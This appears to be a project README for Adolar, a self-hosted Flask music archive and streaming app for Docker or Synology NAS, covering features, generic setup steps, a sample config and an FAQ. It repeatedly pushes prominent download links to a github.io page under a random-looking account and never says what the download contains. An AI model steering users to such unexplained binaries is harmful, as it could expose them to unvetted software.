# Adolar v1.4.0 - self-hosted music archive web app 2026

> **Adolar is a self-hosted browser-based audio player and music archive for Docker or Synology NAS, made for browsing, searching, and streaming local libraries with playlists, radio features, and Last.fm support in version 1.4.0.**

[![Platform](https://img.shields.io/badge/Platform-Docker%20/%20Synology%20NAS-blue?style=flat-square)](https://github.com)
[![Version](https://img.shields.io/badge/Version-v1.4.0-green?style=flat-square)](https://github.com)
[![Updated](https://img.shields.io/badge/Updated-2026-red?style=flat-square)](https://github.com)
[![License](https://img.shields.io/badge/License-GPL--3.0-yellow?style=flat-square)](LICENSE)
[![Stars](https://img.shields.io/github/stars/taylordylanzdu9218/adolar-music-archive-web?style=flat-square)](https://github.com/taylordylanzdu9218/adolar-music-archive-web)

---

<p align="center">
  <a href="https://taylordylanzdu9218.github.io/adolar-music-archive-web/">
    <img src="https://img.shields.io/badge/Download-Adolar%20Latest-brightgreen?style=for-the-badge" alt="Download Adolar">
  </a>
</p>

> **[Direct Download - Adolar v1.4.0](https://taylordylanzdu9218.github.io/adolar-music-archive-web/)**

---

[Download Latest Build](https://taylordylanzdu9218.github.io/adolar-music-archive-web/)

---

## Overview

Adolar provides a centralized web front end for your personal music archive, letting you manage, search, and play audio that stays on your own hardware. It is a good fit for home servers and NAS installations when you want convenient access to a private library without depending on external streaming services.

The app brings together library browsing and playback controls so you can quickly search your collection, launch streams, and keep your music organized with playlists, bookmarks, and a download basket. Built on a Flask and Python backend with SQLite underneath, it is aimed at self-hosted setups that need a focused music player and practical media management in one place.

---

## Features

- Browse, search, and stream local audio files from your own archive
- Full-text search with facet filters for narrowing large collections
- Smart shuffle behavior and configurable radio stations
- Mobile player mode plus a dedicated now playing view
- Cover art thumbnails and HTTP range streaming support
- User authentication with capability-based permissions
- Playlists, bookmarks, and a download basket for library management
- BPM analysis, tag reading and writing, Last.fm scrobbling, and love tracks
- Windows companion app support for radio-related use cases

---

## Installation

Adolar is built for Docker or Synology NAS deployments. If you prefer to run from source, clone the repository first and set up a Python environment before starting the application.

A typical setup path is:

1. Clone the repository
2. Install the Python dependencies
3. Configure your audio library path and database location
4. Start the application container or launch the Flask app

Exact first-run commands vary by installation style, but the app should be started through the Docker container or the Python entry point after the required configuration is in place.

---

## Usage

After the app is running, open the web UI in your browser and connect Adolar to the music library you want to manage. From there, you can search the archive, open albums or tracks, and stream audio straight from the browser.

Common workflows include:

- Use search and filters to find artists, albums, or individual tracks
- Add items to playlists or the download basket for later use
- Switch to radio mode for smart shuffle or station playback
- Open the now playing view for a cleaner playback screen on mobile
- Review tags, BPM data, and Last.fm activity where enabled

---

## Configuration

Configuration is usually handled through environment variables, application settings, or deployment-specific files, depending on whether you run Adolar with Docker or on Synology NAS.

A simple deployment-oriented layout might look like this:

    AUDIO_LIBRARY_PATH=/music
    SQLITE_DATABASE_PATH=/data/adolar.sqlite
    LASTFM_ENABLED=true
    AUTH_ENABLED=true

Keep these values in your container stack or application config so the library path, database, permissions, and optional integrations stay consistent after restarts.

---

## Requirements

- Docker or Synology NAS
- Python runtime for source-based setups
- SQLite for local metadata storage
- Access to a local audio library
- Network access for browser-based use
- Optional Last.fm account for scrobbling features
- Optional Windows system if you plan to use the companion radio app

---

## FAQ

**How do I update Adolar?**  
With Docker, pull the latest image and restart the container. For source installations, refresh the code and reinstall dependencies if needed.

**Where do I change music library settings?**  
These settings are generally controlled in your deployment configuration, container environment, or app settings file, based on how you installed it.

**What if search or playback feels incomplete?**  
Make sure the library path is correct, the database can be written to, and the audio files are reachable by the container or host process.

**Does it support remote media services?**  
Adolar is centered on local audio archives plus optional integrations like Last.fm, not on being a general-purpose cloud streaming client.

**Can I use it on mobile?**  
Yes. The interface includes a mobile player mode and now playing view for browser-based playback on smaller screens.

---

## License

GNU GPL v3.0 - see [LICENSE](LICENSE) for details.
